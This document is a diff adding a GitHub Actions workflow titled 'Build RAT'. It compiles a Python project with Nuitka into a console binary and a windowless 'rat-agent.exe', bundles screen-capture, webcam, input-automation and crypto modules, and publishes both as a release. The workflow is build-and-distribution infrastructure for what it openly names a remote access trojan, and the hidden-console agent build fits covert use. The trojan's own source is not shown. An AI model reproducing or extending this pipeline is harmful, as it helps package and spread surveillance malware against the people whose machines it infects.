@@ -1,0 +1,60 @@
+name: Build RAT
+
+on:
+  push:
+    tags: ['v*']
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-latest
+    
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Install dependencies
+        run: |
+          pip install --upgrade pip
+          pip install nuitka ordered-set zstandard
+          pip install -r requirements.txt
+
+      - name: Build Console
+        run: |
+          python -m nuitka --onefile --windows-console-mode=force --enable-plugin=anti-bloat --include-module=cryptography --include-module=PIL --include-module=psutil --include-module=cv2 --include-module=pyautogui --include-module=mss --output-filename=rat-console.exe main.py
+
+      - name: Build Agent
+        run: |
+          python -m nuitka --onefile --windows-console-mode=disable --enable-plugin=anti-bloat --include-module=cryptography --include-module=PIL --include-module=psutil --include-module=cv2 --include-module=pyautogui --include-module=mss --output-filename=rat-agent.exe main.py
+
+      - name: Upload artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: RAT-Binaries
+          path: |
+            rat-console.exe
+            rat-agent.exe
+
+  release:
+    needs: build
+    runs-on: ubuntu-latest
+    if: startsWith(github.ref, 'refs/tags/v')
+    permissions:
+      contents: write
+    
+    steps:
+      - uses: actions/download-artifact@v4
+        with:
+          name: RAT-Binaries
+
+      - name: Create Release
+        uses: softprops/action-gh-release@v2
+        with:
+          files: |
+            rat-console.exe
+            rat-agent.exe
+          draft: false
